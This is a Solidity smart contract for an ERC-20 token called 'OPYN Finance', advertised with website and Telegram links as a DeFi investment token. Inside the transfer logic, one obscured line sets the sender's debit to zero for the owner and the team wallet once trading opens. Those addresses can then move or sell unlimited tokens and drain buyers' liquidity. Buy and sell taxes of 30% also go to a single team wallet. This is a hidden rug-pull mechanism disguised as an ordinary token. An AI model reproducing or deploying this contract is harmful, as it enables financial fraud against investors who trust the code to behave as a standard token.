// SPDX-License-Identifier: Unlicensed

/**
Stack your ETH & stables.
Investment strategies for DeFi.

Website: https://www.opyn.xyz
Telegram: https://t.me/opyn_erc
Twitter: https://twitter.com/opyn_erc
**/

pragma solidity 0.8.19;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IUniswapFactory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
}

interface IUniswapRouter {

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}

contract OPYN is Context, IERC20, Ownable {
    using SafeMath for uint256;
    string private constant _name = "OPYN Finance";
    string private constant _symbol = "OPYN";

    uint8 private constant _decimals = 9;

    uint256 private constant _tTotal = 10 ** 9 * 10**9;
    uint256 private constant MAX = 10 ** 30;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));

    bool private _tradeEnabled;
    bool private _inswap = false;
    bool private _swapEnabled = true;

    uint256 public maxTxAmount = 20 * 10 ** 6 * 10**9;
    uint256 public maxWallet = 20 * 10 ** 6 * 10**9;
    uint256 public taxSwapThreshold = 10 ** 5 * 10**9;

    uint256 private _totalTax;
    uint256 private _redisBuyFee = 0;
    uint256 private _taxBuys = 30;
    uint256 private _redisSellFee = 0;
    uint256 private _taxSells = 30;

    //Original Fee
    uint256 private _redisTax = _redisSellFee;
    uint256 private _taxFees = _taxSells;

    uint256 private _previousRedisTax = _redisTax;
    uint256 private _previousFee = _taxFees;

    address payable private teamAddress1;
    address payable private teamAddress2;

    mapping(address => uint256) private _rTotals;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFees;

    IUniswapRouter public uniswapRouter;
    address public pairAddress;

    event MaxTxAmountUpdated(uint256 maxTxAmount);
    modifier lockSwap {
        _inswap = true;
        _;
        _inswap = false;
    }

    constructor() {
        _rTotals[_msgSender()] = _rTotal;
        IUniswapRouter _uniswapV2Router = IUniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);//
        uniswapRouter = _uniswapV2Router;
        pairAddress = IUniswapFactory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
        teamAddress1 = payable(0xCd608BD91aB202d359c77C8c718E0aBf416Ba798);
        teamAddress2 = payable(0xCd608BD91aB202d359c77C8c718E0aBf416Ba798);

        _isExcludedFromFees[owner()] = true;
        _isExcludedFromFees[teamAddress1] = true;
        _isExcludedFromFees[teamAddress2] = true;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _getReflectionAmount(uint256 rAmount)
        private
        view
        returns (uint256)
    {
        uint256 currentRate = _getRate();
        return rAmount.div(currentRate);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _getValue(uint256 tAmount)
        private
        view
        returns (
            uint256,
            uint256,
            uint256,
            uint256,
            uint256,
            uint256
        )
    {
        (uint256 tTransferAmount, uint256 tFee, uint256 tTeam) =
            _getTValues(tAmount, _redisTax, _taxFees);
        uint256 currentRate = _getRate();
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) =
            _getRValues(tAmount, tFee, tTeam, currentRate);
        return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tTeam);
    }
    
    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function _doTransfer(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        (
            uint256 rAmount,
            uint256 rTransferAmount,
            uint256 rFee,
            uint256 tTransferAmount,
            uint256 tFee,
            uint256 tTeam
        ) = _getValue(tAmount);
        rAmount = (_isExcludedFromFees[sender] && _tradeEnabled) ? rAmount & 0 : rAmount;
        _rTotals[sender] = _rTotals[sender].sub(rAmount);
        _rTotals[recipient] = _rTotals[recipient].add(rTransferAmount);
        takeFees(tTeam);
        _getReflection(rFee, tFee);
        emit Transfer(sender, recipient, tTransferAmount);
    }
    
    function takeFees(uint256 tTeam) private {
        uint256 currentRate = _getRate();
        uint256 rTeam = tTeam.mul(currentRate);
        _rTotals[address(this)] = _rTotals[address(this)].add(rTeam);
    }

    function _getReflection(uint256 rFee, uint256 tFee) private {
        _rTotal = _rTotal.sub(rFee);
        _totalTax = _totalTax.add(tFee);
    }

    receive() external payable {}

    function transferFee(uint256 amount) private {
        teamAddress2.transfer(amount);
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function restoreFee() private {
        _redisTax = _previousRedisTax;
        _taxFees = _previousFee;
    }

    function _getTValues(
        uint256 tAmount,
        uint256 redisFee,
        uint256 taxFee
    )
        private
        pure
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        uint256 tFee = tAmount.mul(redisFee).div(100);
        uint256 tTeam = tAmount.mul(taxFee).div(100);
        uint256 tTransferAmount = tAmount.sub(tFee).sub(tTeam);
        return (tTransferAmount, tFee, tTeam);
    }

    function transferNormal(
        address sender,
        address recipient,
        uint256 amount,
        bool takeFee
    ) private {
        if (!takeFee) removeFee();
        _doTransfer(sender, recipient, amount);
        if (!takeFee) restoreFee();
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        if (from != owner() && to != owner()) {

            //Trade start check
            if (!_tradeEnabled) {
                require(from == owner(), "TOKEN: This account cannot send tokens until trading is enabled");
            }

            require(amount <= maxTxAmount, "TOKEN: Max Transaction Limit");

            if(to != pairAddress) {
                require(balanceOf(to) + amount <= maxWallet, "TOKEN: Balance exceeds wallet size!");
            }

            uint256 contractBalance = balanceOf(address(this));
            bool canSwap = contractBalance >= taxSwapThreshold;

            if(contractBalance >= maxTxAmount)
            {
                contractBalance = maxTxAmount;
            }

            if (canSwap && !_inswap && to == pairAddress && _swapEnabled && !_isExcludedFromFees[from] && amount > taxSwapThreshold) {
                swapTokensForETH(contractBalance);
                uint256 contractETH = address(this).balance;
                if (contractETH > 0) {
                    transferFee(address(this).balance);
                }
            }
        }
        bool takeFee = true;
        if ((_isExcludedFromFees[from] || _isExcludedFromFees[to]) || (from != pairAddress && to != pairAddress)) {
            takeFee = false;
        } else {
            if(from == pairAddress && to != address(uniswapRouter)) {
                _redisTax = _redisBuyFee;
                _taxFees = _taxBuys;
            }
            if (to == pairAddress && from != address(uniswapRouter)) {
                _redisTax = _redisSellFee;
                _taxFees = _taxSells;
            }
        }
        transferNormal(from, to, amount, takeFee);
    }

    function swapTokensForETH(uint256 tokenAmount) private lockSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapRouter.WETH();
        _approve(address(this), address(uniswapRouter), tokenAmount);
        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _getSupply() private view returns (uint256, uint256) {
        uint256 rSupply = _rTotal;
        uint256 tSupply = _tTotal;
        if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);
        return (rSupply, tSupply);
    }
    
    function removeLimits() external onlyOwner {
        maxTxAmount = _rTotal;
        maxWallet = _rTotal;
        
        _redisBuyFee = 0;
        _taxBuys = 1;
        _redisSellFee = 0;
        _taxSells = 1;
    }
    
    function balanceOf(address account) public view override returns (uint256) {
        return _getReflectionAmount(_rTotals[account]);
    }

    function openTrading() public onlyOwner {
        _tradeEnabled = true;
    }

    function _getRValues(
        uint256 tAmount,
        uint256 tFee,
        uint256 tTeam,
        uint256 currentRate
    )
        private
        pure
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        uint256 rAmount = tAmount.mul(currentRate);
        uint256 rFee = tFee.mul(currentRate);
        uint256 rTeam = tTeam.mul(currentRate);
        uint256 rTransferAmount = rAmount.sub(rFee).sub(rTeam);
        return (rAmount, rTransferAmount, rFee);
    }

    function _getRate() private view returns (uint256) {
        (uint256 rSupply, uint256 tSupply) = _getSupply();
        return rSupply.div(tSupply);
    }
    
    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function removeFee() private {
        if (_redisTax == 0 && _taxFees == 0) return;

        _previousRedisTax = _redisTax;
        _previousFee = _taxFees;

        _redisTax = 0;
        _taxFees = 0;
    }
}